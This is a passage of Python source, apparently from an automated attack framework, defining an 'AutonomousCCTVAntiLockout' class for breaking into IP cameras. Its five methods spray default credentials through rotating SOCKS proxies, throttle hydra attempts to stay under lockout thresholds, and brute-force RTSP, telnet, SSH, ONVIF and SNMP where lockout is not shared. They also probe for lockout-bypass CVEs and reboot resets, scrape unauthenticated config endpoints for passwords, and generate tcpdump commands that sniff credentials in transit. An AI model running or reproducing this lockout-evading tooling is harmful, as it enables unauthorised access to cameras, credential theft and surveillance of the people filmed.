    def __init__(self):
        self.audit_log = []

    def _log(self, stage, message, data=None):
        entry = {"stage": stage, "message": message, "timestamp": datetime.now().isoformat(), "data": data}
        self.audit_log.append(entry)

    def distributed_spray(self, target, manufacturer="generic", proxies=None, max_per_ip=2):
        """Strategy 1: Distributed source rotation credential spray.
        Rotates through SOCKS proxies or source interfaces to keep each IP
        under the lockout threshold."""
        self.audit_log = []
        policy = self.LOCKOUT_POLICIES.get(manufacturer, self.LOCKOUT_POLICIES["generic"])
        safe_limit = min(max_per_ip, policy["threshold"] - 1)
        creds = CAMERA_DEFAULT_CREDS.get(manufacturer, CAMERA_DEFAULT_CREDS["generic"])
        if manufacturer != "generic":
            creds = list(creds) + list(CAMERA_DEFAULT_CREDS["generic"])
            creds = list(dict.fromkeys(creds))

        proxy_list = proxies or ["direct"]
        total_creds = len(creds)
        batches = []
        idx = 0
        for proxy in proxy_list:
            batch_creds = creds[idx:idx + safe_limit]
            if not batch_creds:
                break
            batches.append({"proxy": proxy, "credentials": [{"username": u, "password": p} for u, p in batch_creds],
                            "attempt_count": len(batch_creds)})
            idx += safe_limit

        remaining = creds[idx:]

        # Execute batches with hydra through proxies
        results_per_batch = []
        for batch in batches:
            proxy_arg = "" if batch["proxy"] == "direct" else f"-o socks5://{batch['proxy']}"
            for cred in batch["credentials"]:
                hydra_cmd = (
                    f"hydra -l {cred['username']} -p {cred['password']} "
                    f"{proxy_arg} {target} http-get / -t 1 -f -W 1"
                )
                self._log("distributed_spray", f"Trying {cred['username']}:{cred['password']} via {batch['proxy']}")
                hydra_result = execute_command(hydra_cmd)
                hit = "login:" in hydra_result.get("stdout", "").lower()
                results_per_batch.append({
                    "proxy": batch["proxy"],
                    "username": cred["username"],
                    "password": cred["password"],
                    "success": hit,
                    "output": hydra_result.get("stdout", "")[:200],
                })

        successful = [r for r in results_per_batch if r["success"]]

        return {
            "success": True, "target": target,
            "engine": "AutonomousCCTVAntiLockout",
            "strategy": "distributed_spray",
            "manufacturer": manufacturer,
            "lockout_policy": policy,
            "safe_attempts_per_ip": safe_limit,
            "total_credentials": total_creds,
            "proxies_used": len(proxy_list),
            "batches": batches,
            "credentials_tested": len(results_per_batch),
            "credentials_remaining": len(remaining),
            "successful_logins": [{"username": r["username"], "password": r["password"]} for r in successful],
            "successful_count": len(successful),
            "results": results_per_batch,
            "audit_log": self.audit_log,
        }

    def timing_throttle(self, target, manufacturer="generic", max_attempts=10):
        """Strategy 2: Low-and-slow timing-aware throttle.
        Spaces login attempts just under the lockout threshold,
        with adaptive cooldowns between batches."""
        self.audit_log = []
        policy = self.LOCKOUT_POLICIES.get(manufacturer, self.LOCKOUT_POLICIES["generic"])
        safe_batch = policy["threshold"] - 1
        cooldown = policy["lockout_seconds"] + 5  # Add 5s safety margin

        creds = CAMERA_DEFAULT_CREDS.get(manufacturer, CAMERA_DEFAULT_CREDS["generic"])
        if manufacturer != "generic":
            creds = list(creds) + list(CAMERA_DEFAULT_CREDS["generic"])
            creds = list(dict.fromkeys(creds))
        creds = creds[:max_attempts]

        # Build attempt schedule
        schedule = []
        batch_num = 0
        for i in range(0, len(creds), safe_batch):
            batch_creds = creds[i:i + safe_batch]
            batch_num += 1
            wait_after = cooldown if (i + safe_batch) < len(creds) else 0
            schedule.append({
                "batch": batch_num,
                "credentials": [{"username": u, "password": p} for u, p in batch_creds],
                "attempt_count": len(batch_creds),
                "wait_after_seconds": wait_after,
            })

        # Execute first batch only (subsequent batches need real timing)
        first_batch_results = []
        if schedule:
            for cred in schedule[0]["credentials"]:
                hydra_cmd = f"hydra -l {cred['username']} -p {cred['password']} {target} http-get / -t 1 -f -W 1"
                self._log("timing_throttle", f"Batch 1: {cred['username']}:{cred['password']}")
                result = execute_command(hydra_cmd)
                hit = "login:" in result.get("stdout", "").lower()
                first_batch_results.append({
                    "username": cred["username"], "password": cred["password"],
                    "success": hit, "output": result.get("stdout", "")[:200],
                })

        successful = [r for r in first_batch_results if r["success"]]
        total_time = sum(s["wait_after_seconds"] for s in schedule)

        return {
            "success": True, "target": target,
            "engine": "AutonomousCCTVAntiLockout",
            "strategy": "timing_throttle",
            "manufacturer": manufacturer,
            "lockout_policy": policy,
            "safe_batch_size": safe_batch,
            "cooldown_seconds": cooldown,
            "total_batches": len(schedule),
            "total_credentials": len(creds),
            "estimated_total_time_seconds": total_time,
            "schedule": schedule,
            "first_batch_results": first_batch_results,
            "successful_logins": [{"username": r["username"], "password": r["password"]} for r in successful],
            "successful_count": len(successful),
            "audit_log": self.audit_log,
        }

    def cross_protocol(self, target, manufacturer="generic", port=80):
        """Strategy 3: Cross-protocol credential testing.
        Tests credentials on every auth protocol available on the camera,
        exploiting the fact that many cameras enforce lockout only on HTTP."""
        self.audit_log = []
        policy = self.LOCKOUT_POLICIES.get(manufacturer, self.LOCKOUT_POLICIES["generic"])
        creds = CAMERA_DEFAULT_CREDS.get(manufacturer, CAMERA_DEFAULT_CREDS["generic"])
        if manufacturer != "generic":
            creds = list(creds) + list(CAMERA_DEFAULT_CREDS["generic"])
            creds = list(dict.fromkeys(creds))

        # Discover which protocols are available
        protocol_results = {}
        for proto_name, proto_info in self.AUTH_PROTOCOLS.items():
            proto_port = proto_info["port"]
            nmap_cmd = f"nmap -sV -p {proto_port} {target}"
            nmap_result = execute_command(nmap_cmd)
            port_open = f"{proto_port}/tcp" in nmap_result.get("stdout", "") and "open" in nmap_result.get("stdout", "")
            protocol_results[proto_name] = {
                "port": proto_port, "method": proto_info["method"],
                "available": port_open,
                "lockout_shared_with_http": proto_info["lockout_shared"],
                "description": proto_info["description"],
                "attempts": [],
            }

        # For each available independent protocol, test credentials
        independent_protocols = [
            (name, info) for name, info in protocol_results.items()
            if info["available"] and not info["lockout_shared_with_http"]
        ]

        total_tested = 0
        all_hits = []
        for proto_name, proto_info in independent_protocols:
            proto_port = proto_info["port"]
            for username, password in creds[:3]:  # Test top 3 creds per protocol
                self._log("cross_protocol", f"Testing {username}:{password} on {proto_name} (port {proto_port})")

                if "rtsp" in proto_name:
                    cmd = (f"ffprobe -v quiet -rtsp_transport tcp -stimeout 3000000 "
                           f"rtsp://{username}:{password}@{target}:{proto_port}/Streaming/Channels/1")
                elif proto_name == "telnet":
                    cmd = f"nmap -p 23 --script=telnet-brute --script-args userdb=<(echo {username}),passdb=<(echo {password}) {target}"
                elif proto_name == "ssh":
                    cmd = f"hydra -l {username} -p {password} {target} ssh -t 1 -f"
                elif proto_name == "onvif_soap":
                    cmd = (f"curl -s -o /dev/null -w '%{{http_code}}' --connect-timeout 3 "
                           f"-u {username}:{password} http://{target}:{proto_port}/onvif/device_service")
                elif proto_name == "snmp":
                    cmd = f"snmpwalk -v2c -c {password} {target} system 2>&1 | head -1"
                else:
                    cmd = f"curl -s -o /dev/null -w '%{{http_code}}' -u {username}:{password} http://{target}:{proto_port}/"

                result = execute_command(cmd, use_cache=False)
                stdout = result.get("stdout", "")
                hit = False
                if "rtsp" in proto_name:
                    hit = result.get("return_code", -1) == 0
                elif proto_name == "onvif_soap":
                    hit = stdout.strip().strip("'") == "200"
                elif proto_name in ("telnet", "ssh"):
                    hit = "login:" in stdout.lower() or result.get("return_code", -1) == 0
                elif proto_name == "snmp":
                    hit = "SNMPv2-MIB" in stdout or "sysDescr" in stdout
                else:
                    hit = stdout.strip().strip("'") in ("200", "301", "302")

                attempt = {
                    "protocol": proto_name, "username": username, "password": password,
                    "success": hit, "output": stdout[:200],
                }
                proto_info["attempts"].append(attempt)
                total_tested += 1
                if hit:
                    all_hits.append(attempt)

        protocols_available = sum(1 for p in protocol_results.values() if p["available"])
        protocols_independent = len(independent_protocols)

        return {
            "success": True, "target": target,
            "engine": "AutonomousCCTVAntiLockout",
            "strategy": "cross_protocol",
            "manufacturer": manufacturer,
            "lockout_policy": policy,
            "protocols_scanned": len(self.AUTH_PROTOCOLS),
            "protocols_available": protocols_available,
            "protocols_independent": protocols_independent,
            "total_credentials_tested": total_tested,
            "protocol_results": protocol_results,
            "successful_logins": all_hits,
            "successful_count": len(all_hits),
            "audit_log": self.audit_log,
        }

    def lockout_fingerprint(self, target, manufacturer="generic", port=80):
        """Strategy 4: Lockout policy fingerprint & reset exploitation.
        Probes the exact lockout behavior, identifies known bypass CVEs,
        and tests for reset vectors (reboot, MAC change, etc.)."""
        self.audit_log = []
        policy = self.LOCKOUT_POLICIES.get(manufacturer, self.LOCKOUT_POLICIES["generic"])

        # Step 1: Fingerprint manufacturer if unknown
        if manufacturer == "generic":
            nmap_cmd = f"nmap -sV -p 80,554,443,8080 --script=http-title,http-headers {target}"
            nmap_result = execute_command(nmap_cmd)
            nmap_output = nmap_result.get("stdout", "")
            detected_mfg = _guess_camera_manufacturer([], nmap_output)
            if detected_mfg != "generic":
                manufacturer = detected_mfg
                policy = self.LOCKOUT_POLICIES.get(manufacturer, policy)
        self._log("fingerprint", f"Manufacturer: {manufacturer}, policy: threshold={policy['threshold']}")

        # Step 2: Probe lockout by making controlled attempts
        probe_results = []
        for i in range(policy["threshold"] + 1):
            cmd = f"curl -s -o /dev/null -w '%{{http_code}}' --connect-timeout 3 -u test_lockout_probe:wrong_pass_{i} http://{target}:{port}/"
            result = execute_command(cmd, use_cache=False)
            status = result.get("stdout", "").strip().strip("'")
            locked = status in ("403", "429", "503", "000")
            probe_results.append({
                "attempt": i + 1, "http_status": status,
                "locked_out": locked,
            })
            self._log("lockout_probe", f"Attempt {i+1}: HTTP {status} {'LOCKED' if locked else 'OK'}")
            if locked:
                break

        actual_threshold = next((p["attempt"] for p in probe_results if p["locked_out"]), None)

        # Step 3: Check for bypass CVEs
        bypass_cves = policy.get("bypass_cves", [])
        cve_results = []
        for cve_id in bypass_cves:
            nuclei_cmd = f"nuclei -u http://{target}:{port} -id {cve_id.replace('CVE-', 'cve-').lower()} -severity critical,high"
            nuclei_result = execute_command(nuclei_cmd)
            hit = cve_id.lower().replace("-", "") in nuclei_result.get("stdout", "").lower().replace("-", "")
            cve_results.append({
                "cve": cve_id, "vulnerable": hit,
                "output": nuclei_result.get("stdout", "")[:300],
            })
            if hit:
                self._log("cve_bypass", f"VULNERABLE to {cve_id} - authentication bypass available!")

        # Step 4: Test reset vectors
        reset_vectors = []
        # ONVIF reboot
        onvif_reboot_cmd = (
            f"curl -s -o /dev/null -w '%{{http_code}}' --connect-timeout 3 "
            f"http://{target}:{port}/onvif/device_service"
        )
        onvif_result = execute_command(onvif_reboot_cmd)
        onvif_accessible = onvif_result.get("stdout", "").strip().strip("'") in ("200", "401", "405", "500")
        reset_vectors.append({
            "vector": "ONVIF SystemReboot",
            "available": onvif_accessible,
            "resets_lockout": policy.get("reset_on_reboot", False),
            "note": "ONVIF reboot command can reset lockout counters" if onvif_accessible else "ONVIF not accessible",
        })

        # UPnP reset
        upnp_cmd = f"nmap -sU -p 1900 --script=upnp-info {target}"
        upnp_result = execute_command(upnp_cmd)
        upnp_available = "open" in upnp_result.get("stdout", "").lower()
        reset_vectors.append({
            "vector": "UPnP device restart",
            "available": upnp_available,
            "resets_lockout": policy.get("reset_on_reboot", False),
            "note": "UPnP may allow remote restart" if upnp_available else "UPnP not available",
        })

        # Config backup endpoints (may leak credentials, bypassing lockout entirely)
        config_endpoints = self.CONFIG_BACKUP_ENDPOINTS.get(manufacturer, self.CONFIG_BACKUP_ENDPOINTS["generic"])
        config_leaks = []
        for endpoint in config_endpoints:
            curl_cmd = f"curl -s -o /dev/null -w '%{{http_code}}' --connect-timeout 3 http://{target}:{port}{endpoint}"
            curl_result = execute_command(curl_cmd, use_cache=False)
            status = curl_result.get("stdout", "").strip().strip("'")
            if status == "200":
                config_leaks.append({
                    "endpoint": endpoint, "status": status,
                    "severity": "critical",
                    "note": "Config endpoint accessible without auth - may contain plaintext credentials",
                })
                self._log("config_leak", f"Unauthenticated config endpoint: {endpoint}")

        return {
            "success": True, "target": target,
            "engine": "AutonomousCCTVAntiLockout",
            "strategy": "lockout_fingerprint",
            "manufacturer": manufacturer,
            "known_policy": policy,
            "actual_lockout_threshold": actual_threshold,
            "lockout_probe_results": probe_results,
            "bypass_cves": cve_results,
            "bypass_cve_count": sum(1 for c in cve_results if c["vulnerable"]),
            "reset_vectors": reset_vectors,
            "reset_available": any(r["available"] and r["resets_lockout"] for r in reset_vectors),
            "config_leaks": config_leaks,
            "config_leak_count": len(config_leaks),
            "audit_log": self.audit_log,
        }

    def passive_harvest(self, target, manufacturer="generic", port=80, duration=30):
        """Strategy 5: Passive credential harvesting (zero login attempts).
        Sniffs traffic, extracts firmware credentials, and probes config
        backup endpoints - no login attempts means no lockout risk."""
        self.audit_log = []
        policy = self.LOCKOUT_POLICIES.get(manufacturer, self.LOCKOUT_POLICIES["generic"])

        results = {
            "success": True, "target": target,
            "engine": "AutonomousCCTVAntiLockout",
            "strategy": "passive_harvest",
            "manufacturer": manufacturer,
            "login_attempts_made": 0,
            "lockout_risk": "none",
            "harvested_credentials": [],
            "passive_findings": [],
        }

        # Source 1: Config backup endpoint probing (no auth needed)
        config_endpoints = self.CONFIG_BACKUP_ENDPOINTS.get(manufacturer, self.CONFIG_BACKUP_ENDPOINTS["generic"])
        for endpoint in config_endpoints:
            curl_cmd = f"curl -s --connect-timeout 5 http://{target}:{port}{endpoint}"
            curl_result = execute_command(curl_cmd, use_cache=False)
            body = curl_result.get("stdout", "")
            if len(body) > 50:
                # Look for credential patterns in config dump
                import re
                cred_patterns = re.findall(
                    r'(?:password|passwd|pass|pwd|secret|credential)\s*[=:]\s*["\']?([^\s"\'<>&]{3,30})',
                    body, re.IGNORECASE
                )
                user_patterns = re.findall(
                    r'(?:username|user|login|account)\s*[=:]\s*["\']?([^\s"\'<>&]{2,30})',
                    body, re.IGNORECASE
                )
                if cred_patterns or user_patterns:
                    results["harvested_credentials"].append({
                        "source": f"config_backup:{endpoint}",
                        "usernames_found": list(set(user_patterns))[:10],
                        "passwords_found": list(set(cred_patterns))[:10],
                    })
                    self._log("passive_harvest", f"Credentials found in {endpoint}")
                results["passive_findings"].append({
                    "source": "config_backup", "endpoint": endpoint,
                    "accessible": True, "body_length": len(body),
                    "credentials_extracted": len(cred_patterns),
                })
            else:
                results["passive_findings"].append({
                    "source": "config_backup", "endpoint": endpoint,
                    "accessible": len(body) > 0, "body_length": len(body),
                    "credentials_extracted": 0,
                })

        # Source 2: UPnP device description (model/firmware info for targeted attacks)
        upnp_cmd = f"curl -s --connect-timeout 5 http://{target}:{port}/deviceDescription.xml"
        upnp_result = execute_command(upnp_cmd, use_cache=False)
        upnp_body = upnp_result.get("stdout", "")
        if "<device>" in upnp_body.lower() or "<root" in upnp_body.lower():
            results["passive_findings"].append({
                "source": "upnp_description", "accessible": True,
                "body_length": len(upnp_body),
                "note": "UPnP device description leaked - may contain model/firmware for targeted CVE lookup",
            })

        # Source 3: RTSP unauthenticated stream check (proves access without login)
        rtsp_paths = CAMERA_RTSP_PATHS.get(manufacturer, CAMERA_RTSP_PATHS["generic"])
        for rpath in rtsp_paths[:3]:
            rtsp_url = f"rtsp://{target}:554{rpath}"
            ffprobe_cmd = (
                f"ffprobe -v quiet -print_format json -show_streams "
                f"-rtsp_transport tcp -stimeout 3000000 {rtsp_url}"
            )
            probe = execute_command(ffprobe_cmd, use_cache=False)
            if probe.get("return_code", -1) == 0:
                results["passive_findings"].append({
                    "source": "rtsp_unauthenticated", "url": rtsp_url,
                    "accessible": True,
                    "note": "RTSP stream accessible without authentication - video access confirmed",
                    "severity": "critical",
                })
                self._log("passive_harvest", f"Unauthenticated RTSP: {rtsp_url}")

        # Source 4: HTTP headers fingerprinting
        headers_cmd = f"curl -s -I --connect-timeout 5 http://{target}:{port}/"
        headers_result = execute_command(headers_cmd, use_cache=False)
        headers = headers_result.get("stdout", "")
        if headers:
            results["passive_findings"].append({
                "source": "http_headers", "headers": headers[:500],
                "note": "HTTP headers may reveal server software, firmware version, and auth requirements",
            })

        # Source 5: tcpdump passive sniff command (generate command, don't run long capture)
        results["sniff_commands"] = {
            "http_basic_auth": f"tcpdump -i any -A -s0 'host {target} and port {port}' | grep -i 'Authorization: Basic'",
            "rtsp_digest_auth": f"tcpdump -i any -A -s0 'host {target} and port 554' | grep -i 'Authorization: Digest'",
            "note": f"Run these commands for {duration}s to passively capture credentials in transit",
            "duration_seconds": duration,
        }

        results["total_credentials_harvested"] = len(results["harvested_credentials"])
        results["total_findings"] = len(results["passive_findings"])
        results["audit_log"] = self.audit_log
        return results

